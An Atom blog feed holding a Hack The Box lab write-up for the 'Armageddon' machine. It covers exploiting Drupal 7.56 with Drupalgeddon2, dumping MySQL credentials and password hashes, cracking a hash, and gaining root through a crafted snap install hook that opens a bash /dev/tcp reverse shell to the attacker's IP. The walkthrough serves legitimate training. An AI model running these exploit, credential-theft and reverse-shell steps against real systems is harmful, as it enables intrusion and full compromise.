<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-05-16T12:15:41+02:00</updated><id>/feed.xml</id><title type="html">CTF Writeups &amp;amp; Tech Stuff</title><subtitle>HTB Writeups and other techhie stuff</subtitle><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><entry><title type="html">HTB Writeup - Armageddon</title><link href="/posts/HTB-Writeup-Armageddon" rel="alternate" type="text/html" title="HTB Writeup - Armageddon" /><published>2021-05-09T23:20:00+02:00</published><updated>2021-05-09T23:20:00+02:00</updated><id>/posts/HTB-Writeup:-Armageddon</id><content type="html" xml:base="/posts/HTB-Writeup-Armageddon">&lt;p&gt;Write up for the easy-rated HTB box &lt;strong&gt;Armageddon&lt;/strong&gt;, completed on May 9th 2021. Fairly straightforward machine if you know where to look; 80% of the time spent here was on trying to do “optional” steps.&lt;/p&gt;

&lt;p&gt;Note that I try to write up my complete process and not only the straight way to get the flags, including errors and time-wasters, which I see as opportunity to learn instead of giving the straight up solution every time.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;p&gt;We start with standard &lt;strong&gt;nmap&lt;/strong&gt; initial enumeration by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sC -sV -oA nmap/armageddon 10.10.10.233&lt;/code&gt;, which gives us:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-04-25 18:41 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.233
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.032s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.6 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-generator: Drupal 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-robots.txt: 36 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.4.16
|_http-title:  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;9.76 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Out of this scan we gain the following information:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Target is running CentOS&lt;/li&gt;
  &lt;li&gt;We are dealing with a web serer mostly on port 80, with &lt;strong&gt;Drupal&lt;/strong&gt; CMS.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; is found.&lt;/li&gt;
  &lt;li&gt;We also have a SSH service going on.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We start a full namp scan in the background and start poking around the web page.&lt;/p&gt;

&lt;h3 id=&quot;web-recon---80&quot;&gt;Web Recon - 80&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425185006.png&quot; alt=&quot;Pasted image 20210425185006&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At first view, the site is very basic. We go straight away to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file found by nmap, which shows a lot of disallowed/allowed location, which are most likely automatically generated on any Drupal install, however one entry stands out:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
[...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CHANGELOG.txt&lt;/code&gt; file is usually a good way to find exactly which version we are dealing with. Before going any further we start in the background a &lt;strong&gt;gobuster&lt;/strong&gt; reconnaissance on the root of the server just in case. Further looking at the changelog, we can now see that we are dealing with &lt;strong&gt;Drupal 7.56&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425185818.png&quot; alt=&quot;Pasted image 20210425185818&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Which is severely outdated; released in 2017-06 and this box is being done on 2021-05. Not surprising that we can find exploit for this version in &lt;strong&gt;ExploitDB&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425231735.png&quot; alt=&quot;Pasted image 20210425231735&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we now attempt to run those exploit in order to achieve RCE.&lt;/p&gt;

&lt;h2 id=&quot;drupal-exploitation&quot;&gt;Drupal Exploitation&lt;/h2&gt;

&lt;p&gt;In the exploit search results we have, we first see that the latest, &lt;strong&gt;Drupalgeddon3&lt;/strong&gt;, requires authentication. We go back to the site and attempt creating a user, but with no success:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425232303.png&quot; alt=&quot;Pasted image 20210425232303&quot; /&gt;&lt;/p&gt;

&lt;p&gt;:information_source: &lt;em&gt;META: Always a good sign we are on the right path when the theme of the exploit is matching the name of the machine.&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;rce---drupalgeddon2&quot;&gt;RCE - Drupalgeddon2&lt;/h3&gt;

&lt;p&gt;We start looking in &lt;strong&gt;Drupalgeddon2&lt;/strong&gt; which is also available; from reading its POC, it looks like we may be able to exploit the service without authentication&lt;/p&gt;

&lt;p&gt;Running the exploit with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby exploit.rb 10.10.10.233&lt;/code&gt; succeeds and we now have RCE as the user &lt;strong&gt;apache&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425233713.png&quot; alt=&quot;Pasted image 20210425233713&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Important to note that this is actually a shell, rather the exploit wrote a php file on the server which will execute whichever command we POST to it.&lt;/p&gt;

&lt;h3 id=&quot;extracting-information&quot;&gt;Extracting Information&lt;/h3&gt;

&lt;p&gt;With the limited RCE capabilities we landed, we now try to get some additional information about the target. Always a good idea to start by looking at the service you’ve just exploited, so we go look at the Drupal’s configuration file in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sites/default/settings.php &lt;/code&gt; and find some &lt;strong&gt;MySQL&lt;/strong&gt; credentials in it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210502185422.png&quot; alt=&quot;Pasted image 20210502185422&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We also dump the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; content:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aside from root, the only user with a shell would be &lt;strong&gt;brucetherealadmin&lt;/strong&gt;, which we take note of. Since we just got MySQL credentials, we target this service next. The limited shell does not let us entering an interactive shell session with &lt;strong&gt;mysql&lt;/strong&gt;, so we need to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; flag to execute commands while giving our credentials:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210507000808.png&quot; alt=&quot;Pasted image 20210507000808&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drupal&lt;/code&gt; database, we dump the content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; table:&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;armageddon&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'drupaluser'&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--password=CQHEy@9M*m23gBVj -e &quot;use drupal; select * from users&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;theme&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;signature_format&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;created&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;access&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;timezone&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;language&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;picture&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;data&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;                                               &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;            &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;               &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;brucetherealadmin&lt;/span&gt;       &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oOsUf1xAhaadURt&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;armageddon&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eu&lt;/span&gt;                     &lt;span class=&quot;n&quot;&gt;filtered_html&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;1606998756&lt;/span&gt;      &lt;span class=&quot;mi&quot;&gt;1607077194&lt;/span&gt;      &lt;span class=&quot;mi&quot;&gt;1607076276&lt;/span&gt;      &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;Europe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;London0&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;armageddon&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eu&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;overlay&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So here we find a matching hash &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&lt;/code&gt; for the same user as above. Next to crack this hash, we verify it’s type, which according to &lt;strong&gt;hashcat&lt;/strong&gt; documentation matches to the Drupal7 format:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210507001543.png&quot; alt=&quot;Pasted image 20210507001543&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using this mode against the &lt;strong&gt;rockyou.txt&lt;/strong&gt; list, we manage to crack the hash which gives us the password &lt;strong&gt;booboo&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;We immediately try the credentials &lt;strong&gt;brucetherealadmin:booboo&lt;/strong&gt; on the &lt;strong&gt;ssh&lt;/strong&gt; service and we get a shell as brucetherealadmin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210507195140.png&quot; alt=&quot;Pasted image 20210507195140&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;shell---brucetherealadmin&quot;&gt;Shell - brucetherealadmin&lt;/h2&gt;

&lt;p&gt;Now on the box as &lt;strong&gt;brucetherealadmin&lt;/strong&gt;, we are able to get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; flag :white_flag:. ​&lt;/p&gt;

&lt;p&gt;We proceed with standard user enumeration:&lt;/p&gt;

&lt;h3 id=&quot;open-ports&quot;&gt;Open Ports&lt;/h3&gt;

&lt;p&gt;A quick check for open ports shows:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-tunlp&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;No info could be &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-p&quot;&lt;/span&gt;: geteuid&lt;span class=&quot;o&quot;&gt;()=&lt;/span&gt;1000 but you should be root.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Active Internet connections &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;only servers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -           
tcp        0      0 0.0.0.0:22              0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -           
tcp        0      0 127.0.0.1:25            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -           
tcp6       0      0 :::80                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -           
tcp6       0      0 :::22                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -           
tcp6       0      0 ::1:25                  :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -      
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nothing new here, except we notice a &lt;strong&gt;SMTP&lt;/strong&gt; server seem to be running locally. Aside from taking notes of this we move on to additional enumeration.&lt;/p&gt;

&lt;h3 id=&quot;sudo-permissions&quot;&gt;Sudo Permissions&lt;/h3&gt;

&lt;p&gt;Given we authenticated with password, we check for the results of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; which gives is:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;brucetherealadmin on armageddon:
    &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, &lt;span class=&quot;nv&quot;&gt;env_keep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/snap &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We definitively have something interesting here; we are allowed to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snap install&lt;/code&gt; as &lt;strong&gt;sudo&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escalation---snap&quot;&gt;Escalation - Snap&lt;/h3&gt;

&lt;p&gt;Looking at &lt;a href=&quot;https://gtfobins.github.io/gtfobins/snap/&quot;&gt;&lt;strong&gt;GTFOBins&lt;/strong&gt;&lt;/a&gt;, we can see there is a way to execute commands as root:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;COMMAND&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
cd&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; meta/hooks
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#!/bin/sh\n%s; false'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$COMMAND&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;meta/hooks/install
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x meta/hooks/install
fpm &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; xxxx &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; snap &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; all meta

&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snap &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;xxxx_1.0_all.snap &lt;span class=&quot;nt&quot;&gt;--dangerous&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--devmode&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Trying out this same POC, we confirm we are able to execute as root:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210509230422.png&quot; alt=&quot;Pasted image 20210509230422&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We simply need to forge a different payload to send us back a reverse shell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; meta/hooks
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#!/bin/sh\n%s; false'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.2/9001 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;meta/hooks/install
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x meta/hooks/install
fpm &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; rev1 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; snap &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; all meta
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;:warning: &lt;em&gt;At first, the error “/snap/revsh/x1/meta/hooks/install: Syntax error: Bad fd number)” was being thrown around. This is probably because the command was being executed with sh and not bash. Reworking the payload a bit to specify bash and its command argument did the trick.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Downloading the payload and executing it: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo snap install rev1_1.0_all.snap --dangerous --devmode&lt;/code&gt; while having a listener on our host gives us &lt;strong&gt;root&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210509233316.png&quot; alt=&quot;Pasted image 20210509233316&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we are able to get the &lt;strong&gt;root.txt&lt;/strong&gt; flag :black_flag:.&lt;/p&gt;</content><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><category term="htb" /><summary type="html">Write up for the easy-rated HTB box Armageddon, completed on May 9th 2021. Fairly straightforward machine if you know where to look; 80% of the time spent here was on trying to do “optional” steps.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/4256f259c8ac66a3eda11206371eaf8b.png" /><media:content medium="image" url="/assets/images/4256f259c8ac66a3eda11206371eaf8b.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HTB Writeup - Bucket</title><link href="/posts/HTB-Writeup-Bucket" rel="alternate" type="text/html" title="HTB Writeup - Bucket" /><published>2021-04-25T13:40:00+02:00</published><updated>2021-04-25T13:40:00+02:00</updated><id>/posts/HTB-Writeup:-Bucket</id><content type="html" 